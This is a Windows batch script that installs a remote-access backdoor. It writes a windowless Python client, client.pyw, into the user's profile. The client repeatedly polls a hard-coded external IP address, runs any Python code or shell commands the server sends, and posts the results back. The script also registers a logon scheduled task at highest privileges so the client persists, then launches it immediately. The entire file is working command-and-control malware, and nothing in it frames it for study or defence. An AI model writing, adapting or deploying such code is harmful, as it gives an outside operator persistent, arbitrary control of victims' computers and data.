@echo off
setlocal

:: Define the target directory as the current user's profile directory
set "TARGET_DIR=%USERPROFILE%"



:: The user's profile directory should always exist, so no need to create it.
echo.


:: Create client.pyw in the target directory
echo import requests > "%TARGET_DIR%\client.pyw"
echo import time >> "%TARGET_DIR%\client.pyw"
echo import subprocess >> "%TARGET_DIR%\client.pyw"
echo import json >> "%TARGET_DIR%\client.pyw"
echo import io >> "%TARGET_DIR%\client.pyw"
echo import sys >> "%TARGET_DIR%\client.pyw"
echo. >> "%TARGET_DIR%\client.pyw"
echo URL = "http://74.33.102.98:44444/Xslix" >> "%TARGET_DIR%\client.pyw"
echo OUTPUT_URL = "http://74.33.102.98:44444/output/Xslix" >> "%TARGET_DIR%\client.pyw"
echo TOKEN = "724670355246940303" >> "%TARGET_DIR%\client.pyw"
echo payload = {"token": TOKEN} >> "%TARGET_DIR%\client.pyw"
echo. >> "%TARGET_DIR%\client.pyw"
echo def send_output(output): >> "%TARGET_DIR%\client.pyw"
echo     """Sends the output to the server.""" >> "%TARGET_DIR%\client.pyw"
echo     try: >> "%TARGET_DIR%\client.pyw"
echo         requests.post(OUTPUT_URL, json={"output": output, "token": TOKEN}, timeout=5) >> "%TARGET_DIR%\client.pyw"
echo     except requests.exceptions.RequestException as e: >> "%TARGET_DIR%\client.pyw"
echo         # Can't do much if the server is down, just print locally >> "%TARGET_DIR%\client.pyw"
echo         print(f"Failed to send output: {e}") >> "%TARGET_DIR%\client.pyw"
echo. >> "%TARGET_DIR%\client.pyw"
echo def execute_from_response(resp_text): >> "%TARGET_DIR%\client.pyw"
echo     """Parses the response and executes code or command.""" >> "%TARGET_DIR%\client.pyw"
echo     output = "" >> "%TARGET_DIR%\client.pyw"
echo     try: >> "%TARGET_DIR%\client.pyw"
echo         data = json.loads(resp_text) >> "%TARGET_DIR%\client.pyw"
echo. >> "%TARGET_DIR%\client.pyw"
echo         if "code" in data: >> "%TARGET_DIR%\client.pyw"
echo             print("Executing Python code...") >> "%TARGET_DIR%\client.pyw"
echo             old_stdout = sys.stdout >> "%TARGET_DIR%\client.pyw"
echo             redirected_output = sys.stdout = io.StringIO() >> "%TARGET_DIR%\client.pyw"
echo             try: >> "%TARGET_DIR%\client.pyw"
echo                 exec(data["code"], globals()) >> "%TARGET_DIR%\client.pyw"
echo             finally: >> "%TARGET_DIR%\client.pyw"
echo                 sys.stdout = old_stdout >> "%TARGET_DIR%\client.pyw"
echo. >> "%TARGET_DIR%\client.pyw"
echo             output = redirected_output.getvalue() >> "%TARGET_DIR%\client.pyw"
echo. >> "%TARGET_DIR%\client.pyw"
echo         elif "command" in data: >> "%TARGET_DIR%\client.pyw"
echo             print("Executing shell command...") >> "%TARGET_DIR%\client.pyw"
echo             result = subprocess.run(data["command"], shell=True, check=False, capture_output=True, text=True) >> "%TARGET_DIR%\client.pyw"
echo             output = result.stdout + result.stderr >> "%TARGET_DIR%\client.pyw"
echo         elif "null" in data and data["null"] == "null": >> "%TARGET_DIR%\client.pyw"
echo             pass # Do nothing for null response >> "%TARGET_DIR%\client.pyw"
echo. >> "%TARGET_DIR%\client.pyw"
echo     except json.JSONDecodeError: >> "%TARGET_DIR%\client.pyw"
echo         if resp_text.strip() != 'No': >> "%TARGET_DIR%\client.pyw"
echo              output = f"Received non-JSON response: {resp_text}" >> "%TARGET_DIR%\client.pyw"
echo     except Exception as e: >> "%TARGET_DIR%\client.pyw"
echo         output = f"An error occurred during execution: {e}" >> "%TARGET_DIR%\client.pyw"
echo. >> "%TARGET_DIR%\client.pyw"
echo     if output: >> "%TARGET_DIR%\client.pyw"
echo         send_output(output) >> "%TARGET_DIR%\client.pyw"
echo. >> "%TARGET_DIR%\client.pyw"
echo if __name__ == "__main__": >> "%TARGET_DIR%\client.pyw"
echo     while True: >> "%TARGET_DIR%\client.pyw"
echo         try: >> "%TARGET_DIR%\client.pyw"
echo             resp = requests.get(URL, params=payload, timeout=10) >> "%TARGET_DIR%\client.pyw"
echo. >> "%TARGET_DIR%\client.pyw"
echo             if resp.status_code == 200 and resp.text.strip(): >> "%TARGET_DIR%\client.pyw"
echo                 print(f"Content: {resp.text.strip()}") >> "%TARGET_DIR%\client.pyw"
echo                 execute_from_response(resp.text) >> "%TARGET_DIR%\client.pyw"
echo. >> "%TARGET_DIR%\client.pyw"
echo         except requests.exceptions.RequestException: >> "%TARGET_DIR%\client.pyw"
echo             # Suppress connection errors to keep the output clean while polling >> "%TARGET_DIR%\client.pyw"
echo             pass >> "%TARGET_DIR%\client.pyw"
echo. >> "%TARGET_DIR%\client.pyw"
echo         time.sleep(3) >> "%TARGET_DIR%\client.pyw"



:: Create onstart.bat to run client.pyw
echo.

echo @echo off > "%TARGET_DIR%\onstart.bat"
echo start "" "%TARGET_DIR%\client.pyw" >> "%TARGET_DIR%\onstart.bat"



:: Create or update the startup task
echo.

schtasks /create /tn "OnStart" /tr "%TARGET_DIR%\onstart.bat" /sc ONLOGON /rl HIGHEST /f
echo.


echo.
call "%TARGET_DIR%\onstart.bat"
pause
endlocal
